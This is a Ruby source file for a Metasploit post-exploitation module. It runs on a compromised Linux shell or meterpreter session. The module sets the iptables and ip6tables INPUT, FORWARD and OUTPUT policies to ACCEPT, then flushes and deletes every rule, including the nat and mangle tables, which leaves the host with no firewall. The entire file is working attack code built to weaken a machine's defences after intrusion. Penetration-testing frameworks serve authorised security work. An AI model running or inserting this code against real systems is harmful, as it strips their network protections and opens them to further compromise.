##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize
    super(
      'Name'         => 'IPTABLES rules removal',
      'Description'  => %q{
        This module will be applied on a session connected to a shell. It will remove all IPTABLES rules.
      },
      'Author'       => 'Alberto Rafael Rodriguez Iglesias <albertocysec[at]gmail.com>',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    )
  end

  def run

    if command_exists?("iptables")
      print_good("Deleting IPTABLES rules...")
      cmd_exec("iptables -P INPUT ACCEPT")
      cmd_exec("iptables -P FORWARD ACCEPT")
      cmd_exec("iptables -P OUTPUT ACCEPT")
      cmd_exec("iptables -t nat -F")
      cmd_exec("iptables -t mangle -F")
      cmd_exec("iptables -F")
      cmd_exec("iptables -X")
      print_good("iptables rules successfully executed")
    else
      print_line("iptables rules could not be executed")
    end
    if command_exists?("ip6tables")
      print_good("Deleting IP6TABLES rules...")
      cmd_exec("ip6tables -P INPUT ACCEPT")
      cmd_exec("ip6tables -P FORWARD ACCEPT")
      cmd_exec("ip6tables -P OUTPUT ACCEPT")
      cmd_exec("ip6tables -t nat -F")
      cmd_exec("ip6tables -t mangle -F")
      cmd_exec("ip6tables -F")
      cmd_exec("ip6tables -X")
      print_good("ip6tables rules successfully executed")
    else
      print_line("ip6tables rules could not be executed")
    end
  end
end
